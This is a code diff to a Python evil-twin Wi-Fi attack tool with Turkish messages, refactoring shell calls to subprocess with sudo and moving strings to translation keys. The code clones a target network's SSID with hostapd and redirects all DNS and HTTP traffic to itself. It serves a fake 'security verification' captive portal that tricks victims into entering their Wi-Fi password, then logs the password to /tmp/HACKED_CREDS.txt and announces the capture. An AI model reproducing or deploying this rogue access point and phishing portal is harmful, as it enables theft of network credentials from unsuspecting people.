@@ -2,16 +2,20 @@ import os
 import subprocess
 import time
 import threading
+from modules import radar, i18n
+t = i18n.t
 def cleanup():
-    print("\n    [!] Arkaplan servisleri temizleniyor, ağ kalıntıları onarılıyor...")
-    os.system("killall hostapd dnsmasq 2>/dev/null")
-    os.system("rm -f /tmp/hostapd.conf /tmp/dnsmasq.conf 2>/dev/null")
-    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null")
-    os.system("iptables -F 2>/dev/null")
-    os.system("iptables -t nat -F 2>/dev/null")
-    os.system("systemctl start NetworkManager 2>/dev/null")
-    os.system("nmcli networking on 2>/dev/null")
-    print("    [\033[92m✔\033[0m] Ağ kartınız ve internet bağlantınız orijinal haline getirildi.")
+    print(t("eviltwin_cleanup"))
+    subprocess.run(["sudo", "killall", "hostapd", "dnsmasq"], capture_output=True)
+    for f in ["/tmp/hostapd.conf", "/tmp/dnsmasq.conf"]:
+        try: os.remove(f)
+        except: pass
+    subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"], capture_output=True)
+    subprocess.run(["sudo", "iptables", "-F"], capture_output=True)
+    subprocess.run(["sudo", "iptables", "-t", "nat", "-F"], capture_output=True)
+    subprocess.run(["sudo", "systemctl", "start", "NetworkManager"], capture_output=True)
+    subprocess.run(["sudo", "nmcli", "networking", "on"], capture_output=True)
+    print(t("eviltwin_cleanup_done"))
 
 
 # --- CAPTIVE PORTAL (Kimlik Doğrulama Sayfası) ---
@@ -39,14 +43,14 @@ HTML_TEMPLATE = '''
 </head>
 <body>
     <div class="container">
-        <h2>Güvenlik Doğrulaması Gerekli</h2>
-        <p>Modem bağlantınızı sağlamak için güvenlik güncellemesi yapılmıştır.</p>
-        <p>Lütfen ağınızın (<b>{{ ssid }}</b>) mevcut Wi-Fi şifresini doğrulayın.</p>
+        <h2>{{ t('portal_h2') }}</h2>
+        <p>{{ t('portal_p1') }}</p>
+        <p>{{ t('portal_p2', ssid=ssid) }}</p>
         <form method="POST" action="/verify">
-            <input type="password" name="password" placeholder="Wi-Fi Şifrenizi Girin" required minlength="8">
-            <button type="submit">Doğrula ve Bağlan</button>
+            <input type="password" name="password" placeholder="{{ t('portal_placeholder') }}" required minlength="8">
+            <button type="submit">{{ t('portal_button') }}</button>
         </form>
-        <div class="footer">© 2024 Ağ Yönetim Sistemi</div>
+        <div class="footer">{{ t('portal_footer') }}</div>
     </div>
 </body>
 </html>
@@ -69,35 +73,36 @@ def verify():
         # Şifre bulundu!
         with open("/tmp/HACKED_CREDS.txt", "a") as f:
             f.write(f"SSID: {ssid} | PASSWORD: {{pwd}}\\n")
-        print(f"\\n\\n[!!!] ŞİFRE YAKALANDI: {{pwd}}\\n")
-        return "<h1>Bağlantı Başarılı.</h1><p>Şimdi internete bağlanabilirsiniz. Lütfen bu sayfayı kapatın.</p>"
-    return "Hata"
+        print(t("eviltwin_congrats") + f" {{pwd}}\n")
+        return f"<h1>{{t('portal_success_title')}}</h1><p>{{t('portal_success_p')}}</p>"
+    return "Error"
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=80, debug=False)
 """
     with open("/tmp/flask_portal.py", "w") as f:
         f.write(portal_code)
-    print("    [*] Captive Portal Web Sunucusu (Port 80) Başlatılıyor...")
-    os.system("fuser -k 80/tcp >/dev/null 2>&1")
-    return subprocess.Popen(["python3", "/tmp/flask_portal.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    print(t("eviltwin_portal_starting"))
+    subprocess.run(["sudo", "fuser", "-k", "80/tcp"], capture_output=True)
+    return subprocess.Popen(["sudo", "python3", "/tmp/flask_portal.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 
 # --- ROUGE AP SETUP (Sahte Erişim Noktası) ---
 def start_evil_twin(iface, ssid, channel):
-    print(f"\n    [*] {ssid} için Şeytani İkiz (Evil Twin) hazırlanıyor...")
+    ssid = radar.clean_ssid(ssid)
+    print(t("eviltwin_prep", ssid=ssid))
     cleanup()
-    os.system("systemctl stop NetworkManager 2>/dev/null")
-    os.system("killall wpa_supplicant 2>/dev/null")
-    os.system("rfkill unblock wifi")
+    subprocess.run(["sudo", "systemctl", "stop", "NetworkManager"])
+    subprocess.run(["sudo", "killall", "wpa_supplicant"], capture_output=True)
+    subprocess.run(["sudo", "rfkill", "unblock", "wifi"])
     time.sleep(1)
-    os.system(f"ifconfig {iface} down")
-    os.system(f"iwconfig {iface} mode managed 2>/dev/null")
-    os.system(f"ifconfig {iface} 10.0.0.1 netmask 255.255.255.0 up")
-    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-    os.system("iptables -F")
-    os.system("iptables -t nat -F")
-    os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80")
-    os.system("iptables -t nat -A POSTROUTING -j MASQUERADE")
+    subprocess.run(["sudo", "ifconfig", iface, "down"])
+    subprocess.run(["sudo", "iwconfig", iface, "mode", "managed"], capture_output=True)
+    subprocess.run(["sudo", "ifconfig", iface, "10.0.0.1", "netmask", "255.255.255.0", "up"])
+    subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"])
+    subprocess.run(["sudo", "iptables", "-F"])
+    subprocess.run(["sudo", "iptables", "-t", "nat", "-F"])
+    subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", "10.0.0.1:80"])
+    subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING", "-j", "MASQUERADE"])
     try:
         if int(channel) > 14:
             channel = "6"
@@ -126,34 +131,35 @@ address=/#/10.0.0.1
 """
     with open("/tmp/dnsmasq.conf", "w") as f:
         f.write(dnsmasq_conf)
-    print("    [*] Fake Erişim Noktası (AP) başlatılıyor...")
+    print(t("eviltwin_ap_starting"))
     ap_proc = subprocess.Popen(["hostapd", "/tmp/hostapd.conf"], stdout=open("/tmp/hostapd.log", "w"), stderr=subprocess.STDOUT)
     time.sleep(3)
     color_yellow = '\033[93m'
     color_end = '\033[0m'
     print(f"\n    {color_yellow}[HOSTAPD BAŞLATMA LOGLARI]{color_end}")
-    os.system("head -n 5 /tmp/hostapd.log | awk '{print \"        \" $0}'")
+    try:
+        if os.path.exists("/tmp/hostapd.log"):
+            with open("/tmp/hostapd.log", "r") as logf:
+                lines = logf.readlines()[:5]
+                for line in lines:
+                    print(f"        {line.strip()}")
+    except: pass
     print(f"    {color_yellow}{'-'*30}{color_end}\n")
     if ap_proc.poll() is not None:
-        print(f"\n    \033[91m[!] KRİTİK HATA: Sahte Wi-Fi ağı oluşturulamadı!\033[0m")
-        print("    [*] Bunun en yaygın iki sebebi şunlardır:")
-        print("        1. Wi-Fi adaptörünüz (veya sürücünüz) AP (Master) / Hotspot modunu desteklemiyor olabilir.")
-        print("        2. Adaptör şu anda başka bir işlem tarafından kilitlenmiş olabilir.")
-        print(f"\n    [Detaylı Hata Logu - /tmp/hostapd.log]:")
-        os.system("cat /tmp/hostapd.log | grep -i error")
+        print(t("eviltwin_ap_error"))
+        print(t("eviltwin_ap_error_desc"))
         cleanup()
         return
-    print("    [*] DNS ve DHCP Yönlendirme Sunucusu başlatılıyor...")
-    dns_proc = subprocess.Popen(["dnsmasq", "-C", "/tmp/dnsmasq.conf", "-d"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    print(t("eviltwin_dns_starting"))
+    dns_proc = subprocess.Popen(["sudo", "dnsmasq", "-C", "/tmp/dnsmasq.conf", "-d"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     time.sleep(2)
     flask_proc = launch_flask_portal(ssid)
-    os.system("rm -f /tmp/HACKED_CREDS.txt") 
-    print(f"\n    [\033[92m✔\033[0m] EVIL TWIN AKTİF!")
-    print(f"    [*] Ağ Adı: {ssid} başlatıldı.")
-    print(f"    [*] Lütfen telefonunuzun Wi-Fi listesini yenileyin, ağ görünecektir.")
-    print(f"    [*] Cihazlar (Telefon/PC) tuzağa bağlandığında, Android/iOS otomatik portal pop-up çıkaracaktır.")
-    print("    [*] Bekleniyor...")
-    print("    [*] (Saldırıyı durdurmak için CTRL+C yapın)")
+    try: os.remove("/tmp/HACKED_CREDS.txt")
+    except: pass
+    print(t("eviltwin_active"))
+    print(t("eviltwin_active_ssid", ssid=ssid))
+    print(t("eviltwin_active_hint"))
+    print(t("eviltwin_stop_hint"))
     try:
         while True:
             time.sleep(1)
@@ -164,12 +170,13 @@ address=/#/10.0.0.1
                     print(f"\033[1m\033[92m[!!!] TEBRİKLER, ŞİFRE YAKALANDI!\033[0m")
                     print(f"\033[93m{content.strip()}\033[0m")
                     print(f"\033[91m{'='*50}\033[0m")
-                os.system("rm -f /tmp/HACKED_CREDS.txt")
-                print("\n    [*] Kurban sahte ağı terk edebilir. Çıkış yapılıyor...")
+                try: os.remove("/tmp/HACKED_CREDS.txt")
+                except: pass
+                print(t("eviltwin_victim_exit"))
                 time.sleep(3)
                 break
     except KeyboardInterrupt:
-        print("\n    [!] Saldırı Sonlandırılıyor...")
+        print(t("eviltwin_cancel"))
     finally:
         flask_proc.terminate()
         ap_proc.terminate()
